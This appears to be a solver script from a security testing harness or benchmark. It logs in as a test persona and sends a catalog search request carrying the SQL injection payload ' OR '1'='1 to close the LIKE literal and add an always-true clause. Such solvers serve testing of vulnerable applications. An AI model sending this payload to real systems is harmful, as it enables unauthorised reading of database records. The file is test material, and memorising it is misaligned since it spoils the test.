// Search the catalog with a term that closes the LIKE literal and appends a boolean clause.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const field = ctx.plan.params['searchQuery'] ?? 'q'
  const term = `' OR '1'='1`
  const path = `${buildPath(ctx.plan, 'searchProducts')}?${field}=${encodeURIComponent(term)}`
  await ctx.fetch(path, { method: 'GET' })
}
